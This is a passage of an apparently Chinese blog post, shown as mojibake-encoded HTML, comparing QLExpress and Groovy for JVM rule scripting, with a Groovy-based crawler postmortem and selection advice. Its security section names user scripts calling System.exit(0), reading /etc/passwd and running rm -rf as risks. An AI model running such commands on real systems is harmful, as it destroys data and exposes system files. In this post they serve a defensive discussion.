<span class="hljs-bullet">  -</span> åŠ è¯¦ç»†çš„æ—¥å¿—
<span class="hljs-bullet">  -</span> åœ¨è§„åˆ™ä¸­åŠ æ ‡è¯†
<span class="hljs-bullet">  -</span> å•å…ƒæµ‹è¯•è¦†ç›–
</code></pre>
<h3 data-id="heading-26">Groovy çš„å‘</h3>
<h4 data-id="heading-27">å‘1ï¼šç±»æ³„æ¼ OOMï¼ˆæœ€ä¸¥é‡ï¼‰</h4>
<pre><code class="hljs language-markdown" lang="markdown">ç—‡çŠ¶ï¼š
  è¿è¡Œ 72 å°æ—¶å Metaspace æ»¡
  Full GC é¢‘å‘
  æœ€ç»ˆ OutOfMemoryError
  
åŸå› ï¼š
  æ¯æ¬¡æ‰§è¡Œç”Ÿæˆæ–°ç±»ï¼šScript<span class="hljs-emphasis">_123, Script_</span>124...
  ç±»æœªè¢« GCï¼ˆClassLoader è¿˜åœ¨å¼•ç”¨ï¼‰
  Metaspace æŒç»­å¢é•¿
  
ç›‘æ§å‘½ä»¤ï¼š
  jmap -clstats <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">pid</span>&gt;</span></span> | grep Script_
  
è§£å†³æ–¹æ¡ˆï¼š
<span class="hljs-bullet">  -</span> ç¼“å­˜ç¼–è¯‘ç»“æœï¼ˆç›¸åŒè„šæœ¬å¤ç”¨ Classï¼‰
<span class="hljs-bullet">  -</span> å®šæœŸæ¸…ç† ClassLoader
<span class="hljs-bullet">  -</span> é™åˆ¶è„šæœ¬æ•°é‡ä¸Šé™
<span class="hljs-bullet">  -</span> è®¾ç½® Metaspace å‘Šè­¦
</code></pre>
<h4 data-id="heading-28">å‘2ï¼šå†·å¯åŠ¨æ…¢</h4>
<pre><code class="hljs language-markdown" lang="markdown">ç—‡çŠ¶ï¼š
  ç¬¬ä¸€æ¬¡æ‰§è¡Œéœ€è¦ 200ms
  ç”¨æˆ·æ„ŸçŸ¥æ˜æ˜¾å»¶è¿Ÿ
  
åŸå› ï¼š
  ç¼–è¯‘è€—æ—¶ï¼ˆJavaCompilerï¼‰
  
æ–¹æ¡ˆï¼š
<span class="hljs-bullet">  -</span> é¢„ç¼–è¯‘å¸¸ç”¨è„šæœ¬
<span class="hljs-bullet">  -</span> å¼‚æ­¥ç¼–è¯‘ï¼ˆåå°ç¼–è¯‘ï¼Œå…ˆç”¨æ—§ç‰ˆæœ¬ï¼‰
<span class="hljs-bullet">  -</span> ç¼“å­˜ç¼–è¯‘ç»“æœ
</code></pre>
<h4 data-id="heading-29">å‘3ï¼šå®‰å…¨é£é™©</h4>
<pre><code class="hljs language-markdown" lang="markdown">ç—‡çŠ¶ï¼š
  ç”¨æˆ·æ‰§è¡Œ System.exit(0) å¯¼è‡´æœåŠ¡æŒ‚æ‰
  ç”¨æˆ·è¯»å– /etc/passwd
  ç”¨æˆ·æ‰§è¡Œ rm -rf
  
åŸå› ï¼š
  è„šæœ¬å°±æ˜¯ Java ä»£ç 
  å¯ä»¥è°ƒç”¨ä»»æ„ Java API
  
æ–¹æ¡ˆï¼ˆéƒ½ä¸å®Œç¾ï¼‰ï¼š
<span class="hljs-bullet">  -</span> SecurityManagerï¼ˆJDK 17 å·²åºŸå¼ƒï¼‰
<span class="hljs-bullet">  -</span> ä»£ç å®¡æŸ¥ï¼ˆæ­£åˆ™åŒ¹é…å±é™©ä»£ç ï¼‰
<span class="hljs-bullet">  -</span> æ²™ç®±éš”ç¦»ï¼ˆç‹¬ç«‹è¿›ç¨‹ï¼‰
<span class="hljs-bullet">  -</span> ç™½åå•ï¼ˆåªå…è®¸ç‰¹å®š APIï¼‰
</code></pre>
<h4 data-id="heading-30">å‘4ï¼šè°ƒè¯•å™©æ¢¦</h4>
<pre><code class="hljs language-markdown" lang="markdown">ç—‡çŠ¶ï¼š
  æŠ¥é”™å †æ ˆï¼šat Script<span class="hljs-emphasis">_1234567890.execute(Unknown Source)
  Script_</span>1234567890 åœ¨å“ªï¼Ÿæ‰¾ä¸åˆ°æºç 
  
åŸå› ï¼š
  åŠ¨æ€ç”Ÿæˆçš„ç±»
  æºç å¯èƒ½å·²ç»ä¸åœ¨å†…å­˜é‡Œ
  
æ–¹æ¡ˆï¼š
<span class="hljs-bullet">  -</span> ä¿å­˜è„šæœ¬å’Œç”Ÿæˆç±»çš„æ˜ å°„
<span class="hljs-bullet">  -</span> ä¿å­˜ç¼–è¯‘åçš„æºç 
<span class="hljs-bullet">  -</span> åŠ è¯¦ç»†æ—¥å¿—
</code></pre>
<hr/>
<h2 data-id="heading-31">å…­ã€æˆ‘ä»¬çš„ä¸¤å¹´å™©æ¢¦ï¼šå®Œæ•´å¤ç›˜</h2>
<p><strong>è¿™ä¸æ˜¯å‡è®¾ï¼Œæ˜¯æˆ‘äº²èº«ç»å†çš„çœŸå®æ•…äº‹ã€‚</strong></p>
<h3 data-id="heading-32">èƒŒæ™¯</h3>
<p>2011å¹´ï¼Œæˆ‘ä½œä¸ºé«˜çº§å·¥ç¨‹å¸ˆå…¥èŒäº†ä¸€å®¶å¤§æ•°æ®å…¬å¸ï¼Œè¯¥å…¬å¸ä»¥äº’è”ç½‘çˆ¬è™«æ„å»ºä¸šåŠ¡ã€‚å…¶ä¸­ä¸€å—æ ¸å¿ƒç³»ç»Ÿæ˜¯åˆ†å¸ƒå¼çˆ¬è™«ç³»ç»Ÿï¼Œä»å…¨ç½‘ä¸Šç™¾å®¶æˆ¿åœ°äº§å…¬å¸æŠ“å–æˆ¿æºã€èµ„è®¯ç­‰æ•°æ®ã€‚é‚£æ—¶å€™ Hadoop è¿˜æ²¡æµè¡Œã€‚</p>
<p>å…¬å¸æŠ€æœ¯æ€»ç›‘æ„å»ºäº†ä¸€å¥—å¼•ä»¥ä¸ºå‚²çš„æ¶æ„ï¼šåº•å±‚æ˜¯å¾ˆå…ˆè¿›çš„ç®—æ³•èƒ½åŠ›ï¼ŒåŒ…æ‹¬æŒ‡çº¹ç®—æ³•åšå»é‡ã€æ­£æ–‡æå–ç®—æ³•ä» HTML ä¸­æå–æ ¸å¿ƒå†…å®¹ã€NLP æ‘˜è¦ç”Ÿæˆç­‰ã€‚ä¸Šå±‚åˆ™æ˜¯ Groovy åŠ¨æ€ä»£ç åº“ï¼Œç¾åå…¶æ›°"çŸ­å¹³å¿«ï¼Œåˆ©ç”¨åº•å±‚åœ°åŸºå¿«é€Ÿæ„å»º"ã€‚è¿™æ¯”æŸä¸œçš„"å¤šå¿«å¥½çœ"æå‡ºå¾—è¿˜æ—©ï¼Œè¿™å¾ˆæœ‰è¶£ã€‚</p>
<p>å¬èµ·æ¥å¾ˆç¾å¥½ï¼Œæ¡†æ¶æœ¬èº«ä¹Ÿå¾ˆå¼ºå¤§ã€‚</p>
<h3 data-id="heading-33">ä»å…´å¥‹åˆ°å™©æ¢¦</h3>
<p>åˆšå…¥èŒæ—¶ï¼Œçœ‹åˆ°è¿™å¥—æ¶æ„ï¼Œæˆ‘å¾ˆå…´å¥‹ã€‚åŠ¨æ€åŠ è½½ä»£ç ï¼Ÿå¤ªé…·äº†ï¼ä¸ç”¨é‡å¯å°±èƒ½ä¸Šçº¿æ–°åŠŸèƒ½ï¼Ÿå®Œç¾ï¼åº•å±‚èƒ½åŠ›è¿™ä¹ˆå¼ºå¤§ï¼Ÿå¯ä»¥åšå¾ˆå¤šäº‹ï¼æˆ‘è§‰å¾—è‡ªå·±å¯ä»¥å¤§æ˜¾èº«æ‰‹ã€‚</p>
<p>å´ä¸çŸ¥é“ï¼Œåé¢éƒ½æˆäº†æˆ‘ä»¬çš„æ¶æ¢¦ã€‚</p>
<p>é—®é¢˜å¼€å§‹å‡ºç°ï¼šç„å­¦é—®é¢˜é¢‘å‘ï¼Œä¸çŸ¥é“æ˜¯ Groovy çš„é—®é¢˜è¿˜æ˜¯æ¡†æ¶çš„é—®é¢˜ã€‚æœ‰æ—¶å€™è«åå…¶å¦™å°±æŒ‚äº†ï¼Œæœ‰æ—¶å€™æ€§èƒ½çªç„¶ä¸‹é™ï¼Œæœ‰æ—¶å€™å†…å­˜è«åé£™å‡ã€‚æˆ‘ä»¬åªèƒ½ç»å¸¸åŠ ç­åŠ ç‚¹è°ƒè¯•ï¼Œç¢°åˆ°å®åœ¨æä¸å®šçš„ï¼Œå°±å†™æ–°çš„è¡¥ä¸ç¨‹åºã€‚è¡¥ä¸ç¨‹åºè¶Šæ¥è¶Šå¤šï¼Œç³»ç»Ÿè¶Šæ¥è¶Šä¸å¯æ§ã€‚</p>
<p><strong>è¿™æ ·æŒç»­äº†å¤šä¹…ï¼Ÿä¸¤å¹´ã€‚</strong></p>
<p>ä¸¤å¹´æ—¶é—´é‡Œï¼Œæˆ‘ä»¬å›¢é˜Ÿå¤§éƒ¨åˆ†ç²¾åŠ›éƒ½åœ¨å’Œè¿™å¥—æ¡†æ¶æ–—äº‰ã€‚</p>
<h3 data-id="heading-34">æ¨ç¿»é‡å†™</h3>
<p>ç»ˆäºï¼Œå¿æ— å¯å¿ã€‚æˆ‘æ‰¾æœºä¼šç”¨ Hadoop æ¨ç¿»äº†è¿™å¥—ç³»ç»Ÿï¼Œé‡å†™äº†ä¸€éã€‚é‡å†™åçš„ç³»ç»Ÿæ²¡æœ‰ç„å­¦é—®é¢˜ï¼Œæ²¡æœ‰è«åå…¶å¦™çš„å´©æºƒï¼Œæ€§èƒ½ç¨³å®šå¯é¢„æµ‹ï¼Œç»´æŠ¤æˆæœ¬å¤§å¹…ä¸‹é™ã€‚</p>
<h3 data-id="heading-35">å¤ç›˜ï¼šä¸ºä»€ä¹ˆä¼šå¤±è´¥ï¼Ÿ</h3>
<p><strong>ç¬¬ä¸€ï¼Œè¿‡åº¦è®¾è®¡ã€‚</strong> çˆ¬è™«ç³»ç»ŸçœŸçš„éœ€è¦åŠ¨æ€åŠ è½½ä»£ç å—ï¼Ÿå…¶å®ä¸éœ€è¦ã€‚çˆ¬è™«ç³»ç»Ÿéœ€è¦çš„æ˜¯ç¨³å®šæ€§ï¼ˆ7x24 è¿è¡Œï¼‰ã€å¯è¿½æº¯æ€§ï¼ˆæ—¥å¿—ã€ç›‘æ§ï¼‰ã€å¯æ‰©å±•æ€§ï¼ˆæ–°å¢ç½‘ç«™ï¼‰ã€‚è¿™äº›éƒ½å¯ä»¥é€šè¿‡é…ç½®æ–‡ä»¶å’Œæ’ä»¶åŒ–å®ç°ï¼Œæ ¹æœ¬ä¸éœ€è¦åŠ¨æ€ç¼–è¯‘ã€‚</p>
<p><strong>ç¬¬äºŒï¼ŒæŠ€æœ¯é€‰å‹é”™é…ã€‚</strong> Groovy æœ¬èº«æ˜¯ä¼˜ç§€çš„æŠ€æœ¯ï¼Œéå¸¸é€‚åˆæ’ä»¶æ¡†æ¶ã€ç”¨æˆ·è„šæœ¬ã€ä½é¢‘æ‰©å±•ç­‰åœºæ™¯ï¼ˆJenkinsã€Gradle éƒ½åœ¨ç”¨ï¼‰ã€‚ä½†çˆ¬è™«ç³»ç»Ÿæ˜¯ä»€ä¹ˆåœºæ™¯ï¼Ÿé«˜é¢‘è°ƒç”¨ï¼ˆæ¯ç§’æŠ“å–ä¸Šç™¾é¡µé¢ï¼‰ã€æ ¸å¿ƒé“¾è·¯ï¼ˆä¸èƒ½æŒ‚ï¼‰ã€è¦æ±‚æé«˜ç¨³å®šæ€§ã€‚<strong>è¿™ä¸æ˜¯ Groovy ä¸å¥½ï¼Œæ˜¯æŠŠå¥½æŠ€æœ¯ç”¨é”™äº†åœ°æ–¹ã€‚</strong></p>
<p><strong>ç¬¬ä¸‰ï¼Œç¼ºä¹çº¦æŸã€‚</strong> åŠ¨æ€èƒ½åŠ›ç»™äº†å¤ªå¤šè‡ªç”±ï¼šä»»ä½•äººéƒ½å¯ä»¥å†™åŠ¨æ€ä»£ç ï¼Œæ²¡æœ‰ä»£ç å®¡æŸ¥ï¼Œæ²¡æœ‰æµ‹è¯•è¦æ±‚ï¼Œæ²¡æœ‰è§„èŒƒçº¦æŸã€‚è‡ªç”±å¤šäº†å°±æ˜¯æ··ä¹±ï¼Œæ··ä¹±å¤šäº†å°±æ˜¯ç¾éš¾ã€‚</p>
<p><strong>ç¬¬å››ï¼Œç›‘æ§ç¼ºå¤±ã€‚</strong> æ²¡æœ‰ç›‘æ§ç±»åŠ è½½æƒ…å†µã€å†…å­˜å ç”¨è¶‹åŠ¿ã€æ€§èƒ½æŒ‡æ ‡ã€é”™è¯¯ç‡ã€‚å‡ºé—®é¢˜åªèƒ½ççŒœï¼šæ˜¯ Groovy çš„é—®é¢˜ï¼Ÿæ˜¯æ¡†æ¶çš„é—®é¢˜ï¼Ÿæ˜¯ä¸šåŠ¡ä»£ç çš„é—®é¢˜ï¼Ÿä¸çŸ¥é“ï¼Œåªèƒ½ä¸€ä¸ªä¸ªè¯•ã€‚</p>
<h3 data-id="heading-36">æ­£ç¡®çš„åšæ³•åº”è¯¥æ˜¯ä»€ä¹ˆï¼Ÿ</h3>
<p>çˆ¬è™«ç³»ç»Ÿçš„åˆç†æ¶æ„åº”è¯¥æ˜¯ï¼šé…ç½®é©±åŠ¨ï¼Œæ¯ä¸ªç½‘ç«™ä¸€ä¸ªé…ç½®æ–‡ä»¶ï¼Œå®šä¹‰ URL è§„åˆ™ã€è§£æè§„åˆ™ã€å­˜å‚¨è§„åˆ™ã€‚ç„¶åæ˜¯æ’ä»¶åŒ–ï¼Œä¸åŒç±»å‹ç½‘ç«™ç”¨ä¸åŒæ’ä»¶ï¼Œä½†æ’ä»¶æ˜¯ç¼–è¯‘å¥½çš„ jar åŒ…ï¼Œä¸æ˜¯åŠ¨æ€åŠ è½½ã€‚å†åŠ ä¸Šç°åº¦å‘å¸ƒï¼Œæ–°åŠŸèƒ½å…ˆåœ¨å°æµé‡éªŒè¯ï¼Œç¨³å®šåå†å…¨é‡ï¼Œæ ¹æœ¬ä¸éœ€è¦çƒ­åŠ è½½ã€‚æœ€åæ˜¯å®Œå–„ç›‘æ§ï¼Œæ¯ä¸ªç¯èŠ‚éƒ½æœ‰æŒ‡æ ‡ï¼Œå¼‚å¸¸ç«‹åˆ»å‘Šè­¦ï¼Œå¯å¿«é€Ÿå®šä½é—®é¢˜ã€‚</p>
<p>å¦‚æœçœŸçš„éœ€è¦åŠ¨æ€èƒ½åŠ›ï¼Œä¹Ÿåº”è¯¥åªåœ¨éæ ¸å¿ƒç¯èŠ‚ä½¿ç”¨ï¼Œæ¯”å¦‚æ•°æ®æ¸…æ´—è§„åˆ™å¯ä»¥ç”¨ QLExpressï¼Œå­—æ®µæ˜ å°„é€»è¾‘å¯ä»¥ç”¨ç®€å•è„šæœ¬ï¼Œä½†ç»å¯¹ä¸è¦ç”¨åœ¨æ ¸å¿ƒé“¾è·¯ã€‚è€Œä¸”å¿…é¡»æœ‰ä¸¥æ ¼é™åˆ¶ï¼šç™½åå•æœºåˆ¶ã€è¶…æ—¶æ§åˆ¶ã€èµ„æºé™åˆ¶ã€å®Œå–„çš„é™çº§æ–¹æ¡ˆã€‚è¿˜è¦æœ‰ç›‘æ§å‘Šè­¦ï¼šç±»åŠ è½½æ•°é‡ã€å†…å­˜å ç”¨ã€æ‰§è¡Œè€—æ—¶ã€é”™è¯¯ç‡ã€‚</p>
<h3 data-id="heading-37">æ•™è®­æ€»ç»“</h3>
<p>æŠ€æœ¯é€‰å‹è¦åŒ¹é…ä¸šåŠ¡åœºæ™¯ï¼Œä¸æ˜¯è¶Šå…ˆè¿›è¶Šå¥½ï¼Œä¸æ˜¯è¶Šçµæ´»è¶Šå¥½ã€‚æ ¸å¿ƒç³»ç»Ÿè¦ç¨³å®šå‹å€’ä¸€åˆ‡ï¼Œä¸è¦ç©èŠ±çš„ï¼Œä¸è¦è¿½æ±‚ç‚«æŠ€ã€‚åŠ¨æ€èƒ½åŠ›æ˜¯åŒåˆƒå‰‘ï¼Œç»™ä½ çµæ´»æ€§çš„åŒæ—¶ï¼Œä¹Ÿç»™ä½ å¤æ‚æ€§å’Œé£é™©ã€‚å¯¹çº¿ä¸Šè¦æœ‰æ•¬ç•ä¹‹å¿ƒï¼Œä»»ä½•æ–°æŠ€æœ¯éƒ½è¦å……åˆ†éªŒè¯ï¼Œä»»ä½•æ”¹åŠ¨éƒ½è¦æœ‰é™çº§æ–¹æ¡ˆã€‚</p>
<p>è¿™æ®µç»å†ï¼Œè®©æˆ‘æ·±åˆ»ç†è§£äº†ï¼š<strong>å¤§å¤šæ•°æ—¶å€™ï¼Œä½ çœŸçš„åªéœ€è¦å«å¤–å–ï¼Œä¸éœ€è¦å»ºå¨æˆ¿ã€‚</strong></p>
<hr/>
<h2 data-id="heading-38">ä¸ƒã€æœ‰æ²¡æœ‰ä¸¤å…¨å…¶ç¾çš„æ–¹æ¡ˆï¼Ÿ</h2>
<h3 data-id="heading-39">æ ¸å¿ƒæ€è·¯</h3>
<pre><code class="hljs language-markdown" lang="markdown">é—®é¢˜ï¼š
  èƒ½ä¸èƒ½è‡ªåŠ¨é€‰æ‹©æ‰§è¡Œæ–¹å¼ï¼Ÿ
  ç®€å•è§„åˆ™ â†’ è§£é‡Šæ‰§è¡Œï¼ˆQLExpressï¼‰
  å¤æ‚è§„åˆ™ â†’ ç¼–è¯‘æ‰§è¡Œï¼ˆGroovyï¼‰

å¥½å¤„ï¼š
<span class="hljs-bullet">  -</span> ç®€å•çš„å¿«é€Ÿå¯åŠ¨
<span class="hljs-bullet">  -</span> å¤æ‚çš„æ€§èƒ½ä¼˜åŒ–
<span class="hljs-bullet">  -</span> è‡ªåŠ¨è·¯ç”±ï¼Œç”¨æˆ·æ— æ„ŸçŸ¥
</code></pre>
<h3 data-id="heading-40">å®ç°æ€è·¯</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HybridScriptEngine</span> {
    
    <span class="hljs-keyword">private</span> <span class="hljs-type">QLExpressEngine</span> <span class="hljs-variable">qlEngine</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">QLExpressEngine</span>();
    <span class="hljs-keyword">private</span> <span class="hljs-type">GroovyEngine</span> <span class="hljs-variable">groovyEngine</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">GroovyEngine</span>();
    
    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">execute</span><span class="hljs-params">(String script, Context context)</span> {
        <span class="hljs-comment">// åˆ†æè„šæœ¬å¤æ‚åº¦</span>
        <span class="hljs-type">ScriptComplexity</span> <span class="hljs-variable">complexity</span> <span class="hljs-operator">=</span> analyzeComplexity(script);
        
        <span class="hljs-keyword">if</span> (complexity.isSimple()) {
            <span class="hljs-comment">// ç®€å•è§„åˆ™ï¼šè§£é‡Šæ‰§è¡Œ</span>
            <span class="hljs-keyword">return</span> qlEngine.execute(script, context);
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-comment">// å¤æ‚è§„åˆ™ï¼šç¼–è¯‘æ‰§è¡Œ</span>
            <span class="hljs-keyword">return</span> groovyEngine.execute(script, context);
        }
    }
    
    <span class="hljs-keyword">private</span> ScriptComplexity <span class="hljs-title function_">analyzeComplexity</span><span class="hljs-params">(String script)</span> {
        <span class="hljs-type">ScriptComplexity</span> <span class="hljs-variable">complexity</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ScriptComplexity</span>();
        
        <span class="hljs-comment">// æ£€æŸ¥æ˜¯å¦æœ‰å¾ªç¯</span>
        <span class="hljs-keyword">if</span> (script.contains(<span class="hljs-string">"for"</span>) || script.contains(<span class="hljs-string">"while"</span>)) {
            complexity.setComplex();
        }
        
        <span class="hljs-comment">// æ£€æŸ¥æ˜¯å¦æœ‰å‡½æ•°å®šä¹‰</span>
        <span class="hljs-keyword">if</span> (script.contains(<span class="hljs-string">"def "</span>) || script.contains(<span class="hljs-string">"function"</span>)) {
            complexity.setComplex();
        }
        
        <span class="hljs-comment">// æ£€æŸ¥åµŒå¥—å±‚æ•°</span>
        <span class="hljs-type">int</span> <span class="hljs-variable">nestingLevel</span> <span class="hljs-operator">=</span> countNestingLevel(script);
        <span class="hljs-keyword">if</span> (nestingLevel &gt; <span class="hljs-number">3</span>) {
            complexity.setComplex();
        }
        
        <span class="hljs-keyword">return</span> complexity;
    }
}
</code></pre>
<h3 data-id="heading-41">åŠ¨æ€åˆ‡æ¢ç­–ç•¥</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AdaptiveScriptEngine</span> {
    
    <span class="hljs-keyword">private</span> Map&lt;String, ExecutionStats&gt; statsMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConcurrentHashMap</span>&lt;&gt;();
    
    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">execute</span><span class="hljs-params">(String scriptId, String script, Context context)</span> {
        <span class="hljs-type">ExecutionStats</span> <span class="hljs-variable">stats</span> <span class="hljs-operator">=</span> statsMap.get(scriptId);
        
        <span class="hljs-keyword">if</span> (stats == <span class="hljs-literal">null</span>) {
            <span class="hljs-comment">// é¦–æ¬¡æ‰§è¡Œï¼šå…ˆç”¨è§£é‡Šæ‰§è¡Œ</span>
            <span class="hljs-keyword">return</span> executeWithQL(scriptId, script, context);
        }
        
        <span class="hljs-comment">// æ ¹æ®è°ƒç”¨é¢‘ç‡å†³å®š</span>
        <span class="hljs-keyword">if</span> (stats.getCallFrequency() &gt; <span class="hljs-number">1000</span>) {
            <span class="hljs-comment">// é«˜é¢‘è°ƒç”¨ï¼šç»§ç»­ç”¨è§£é‡Šæ‰§è¡Œï¼ˆç¨³å®šï¼‰</span>
            <span class="hljs-keyword">return</span> executeWithQL(scriptId, script, context);
        } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (stats.getAvgExecutionTime() &gt; <span class="hljs-number">10</span>) {
            <span class="hljs-comment">// ä½é¢‘ä½†è€—æ—¶ï¼šåˆ‡æ¢åˆ°ç¼–è¯‘æ‰§è¡Œ</span>
            <span class="hljs-keyword">return</span> executeWithGroovy(scriptId, script, context);
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-comment">// ä½é¢‘ä¸”å¿«é€Ÿï¼šç»§ç»­ç”¨è§£é‡Šæ‰§è¡Œï¼ˆç®€å•ï¼‰</span>
            <span class="hljs-keyword">return</span> executeWithQL(scriptId, script, context);
        }
    }
}
</code></pre>
<h3 data-id="heading-42">æ³¨æ„äº‹é¡¹</h3>
<pre><code class="hljs language-markdown" lang="markdown">è¿™ç§èåˆæ–¹æ¡ˆçš„é—®é¢˜ï¼š

<span class="hljs-bullet">1.</span> å¢åŠ äº†å¤æ‚åº¦
   éœ€è¦ç»´æŠ¤ä¸¤å¥—å¼•æ“
   éœ€è¦åˆ†æè„šæœ¬å¤æ‚åº¦
   éœ€è¦æ”¶é›†æ‰§è¡Œç»Ÿè®¡
   
<span class="hljs-bullet">2.</span> å¯èƒ½è¯¯åˆ¤
   ç®€å•çš„è¢«åˆ¤æ–­æˆå¤æ‚
   å¤æ‚çš„è¢«åˆ¤æ–­æˆç®€å•
   
<span class="hljs-bullet">3.</span> åˆ‡æ¢æˆæœ¬
   ä» QL åˆ‡åˆ° Groovy éœ€è¦ç¼–è¯‘
   å¯èƒ½å½±å“æ€§èƒ½
   
å»ºè®®ï¼š
  ä¸è¦è¿‡åº¦è®¾è®¡
  å…ˆé€‰ä¸€ä¸ªä¸»æ–¹æ¡ˆ
  åªåœ¨æ˜ç¡®éœ€è¦æ—¶æ‰å¼•å…¥å¦ä¸€ä¸ª
  å¤§å¤šæ•°åœºæ™¯ï¼Œå•ä¸€æ–¹æ¡ˆå°±å¤Ÿäº†
</code></pre>
<hr/>
<h2 data-id="heading-43">å…«ã€ç»™ä½ çš„å»ºè®®ï¼šåˆ«èµ°æˆ‘ä»¬çš„å¼¯è·¯</h2>
<h3 data-id="heading-44">å¦‚æœé€‰ QLExpressï¼ˆè§£é‡Šæ‰§è¡Œï¼‰</h3>
<p><strong>æ ¸å¿ƒç†å¿µ</strong>ï¼šç¨³å®š &gt; æ€§èƒ½ï¼Œå®‰å…¨ &gt; çµæ´»ï¼Œå¯æ§ &gt; å¼ºå¤§ã€‚</p>
<p>è¿™ç§æ–¹æ¡ˆé€‚åˆè¿½æ±‚ç¨³å®šæ€§ã€è§„é¿å¤æ‚åº¦çš„å›¢é˜Ÿï¼Œå°¤å…¶æ˜¯å›¢é˜Ÿ JVM ç»éªŒä¸€èˆ¬çš„æƒ…å†µã€‚æœ€é€‚åˆçš„åœºæ™¯æ˜¯æ ¸å¿ƒé“¾è·¯ã€é«˜é¢‘è°ƒç”¨ã€ç®€å•è§„åˆ™ã€‚</p>
<p><strong>æˆ‘çš„å»ºè®®</strong>ï¼šå¦‚æœä½ çš„éœ€æ±‚åªæ˜¯ç®€å•çš„ if åˆ¤æ–­ã€æ¯”è¾ƒè¿ç®—ï¼Œåˆ«æƒ³å¤ªå¤šï¼Œå°±ç”¨ QLExpressã€‚å®ƒä¸æ˜¯æœ€å¿«çš„ï¼Œä½†æœ€ç¨³ã€‚</p>
<h3 data-id="heading-45">å¦‚æœé€‰ Groovyï¼ˆç¼–è¯‘æ‰§è¡Œï¼‰</h3>
<p><strong>æ ¸å¿ƒç†å¿µ</strong>ï¼šçµæ´» &gt; çº¦æŸï¼Œèƒ½åŠ› &gt; ç®€å•ï¼Œæ‰©å±• &gt; å›ºå®šã€‚</p>
<p>è¿™ç§æ–¹æ¡ˆé€‚åˆæœ‰ JVM è°ƒä¼˜ç»éªŒã€æœ‰å®Œå–„ç›‘æ§ã€èƒ½ç®¡ç†å¤æ‚åº¦çš„å›¢é˜Ÿã€‚<strong>æœ€é€‚åˆçš„åœºæ™¯æ˜¯æ’ä»¶æ¡†æ¶ã€ç”¨æˆ·è„šæœ¬ã€ä½é¢‘æ‰©å±•ã€‚</strong></p>
<p><strong>æˆ‘çš„å»ºè®®</strong>ï¼š</p>
<ul>
<li>å¦‚æœä½ åœ¨åš<strong>æ’ä»¶æ¡†æ¶</strong>ï¼ˆJenkinsã€IDE æ’ä»¶ã€SaaS å¹³å°å®¢æˆ·è„šæœ¬ï¼‰ï¼ŒGroovy æ˜¯æœ€ä½³é€‰æ‹©</li>
<li>å¦‚æœä½ éœ€è¦<strong>å®Œæ•´çš„ç¼–ç¨‹èƒ½åŠ›</strong>ï¼ˆå¾ªç¯ã€å‡½æ•°ã€ç±»ã€æ¥å£ï¼‰ï¼ŒGroovy æ¯” QLExpress å¼ºå¤ªå¤š</li>
<li>å¦‚æœæ˜¯<strong>ä½é¢‘åœºæ™¯</strong>ï¼ˆé…ç½®ä¸­å¿ƒã€ç®¡ç†åå°ã€æ•°æ®å¤„ç†è„šæœ¬ï¼‰ï¼ŒGroovy çš„ç¼–è¯‘è€—æ—¶å¯ä»¥æ¥å—</li>
</ul>
<p><strong>ä½†è®°ä½</strong>ï¼šä¸€å®šè¦æœ‰ç›‘æ§ï¼ˆç±»åŠ è½½æ•°é‡ï¼‰ã€æœ‰ç¼“å­˜ï¼ˆé¿å…é‡å¤ç¼–è¯‘ï¼‰ã€æœ‰é™çº§æ–¹æ¡ˆï¼ˆè„šæœ¬æ‰§è¡Œå¤±è´¥æ€ä¹ˆåŠï¼‰ã€‚</p>
<h3 data-id="heading-46">å·¥ç¨‹çš„æœ¬è´¨</h3>
<p>ä¸æ˜¯é€‰æœ€å¥½çš„ï¼Œæ˜¯é€‰æœ€åˆé€‚çš„ã€‚ä¸æ˜¯éé»‘å³ç™½ï¼Œæ˜¯æƒè¡¡å–èˆã€‚ä¸æ˜¯è¿½æ±‚æè‡´ï¼Œæ˜¯æ»¡è¶³éœ€æ±‚ã€‚ä¸æ˜¯ä¸€åŠ³æ°¸é€¸ï¼Œæ˜¯æŒç»­ä¼˜åŒ–ã€‚</p>
<h3 data-id="heading-47">è®°ä½è¿™å››å¥è¯</h3>
<p><strong>1. å¤§å¤šæ•°æ—¶å€™ï¼Œä½ åªéœ€è¦å«å¤–å–ï¼Œä¸éœ€è¦å»ºå¨æˆ¿</strong></p>
<p>ä¸è¦è¢«æŠ€æœ¯çš„å¼ºå¤§èƒ½åŠ›è¿·æƒ‘ã€‚å¤§å¤šæ•°éœ€æ±‚ï¼Œç®€å•æ–¹æ¡ˆå°±èƒ½è§£å†³ã€‚è¿‡åº¦è®¾è®¡æ˜¯ä¸‡æ¶ä¹‹æºã€‚</p>
<p><strong>2. è§£é‡Šæ‰§è¡Œä¸æ˜¯æ…¢ï¼Œæ˜¯ç¨³ï¼›ç¼–è¯‘æ‰§è¡Œä¸æ˜¯å¿«ï¼Œæ˜¯æœ‰ä»£ä»·</strong></p>
<p>QLExpress å¯åŠ¨å¿«ã€ç¨³å®šã€å¯é¢„æµ‹ï¼Œä½†æ€§èƒ½æœ‰ä¸Šé™ã€‚Groovy æ€§èƒ½å¤©èŠ±æ¿é«˜ï¼Œä½†è¦ä»˜å‡ºå¤æ‚åº¦å’Œé£é™©çš„ä»£ä»·ã€‚</p>
<p><strong>3. æŠ€æœ¯é€‰å‹é”™é…ï¼Œæ¯”æŠ€æœ¯æœ¬èº«çš„é—®é¢˜æ›´å¯æ€•</strong></p>
<p>ç”¨ Groovy åšé«˜é¢‘é£æ§ï¼Ÿå†…å­˜çˆ†ç‚¸ã€‚ç”¨ QLExpress åšå¤æ‚æ’ä»¶ï¼ŸåŠŸèƒ½å—é™ã€‚</p>
<p>ä½†åè¿‡æ¥ï¼šç”¨ Groovy åšæ’ä»¶æ¡†æ¶ï¼Ÿå®Œç¾ã€‚ç”¨ QLExpress åšè§„åˆ™å¼•æ“ï¼Ÿç¨³å®šã€‚</p>
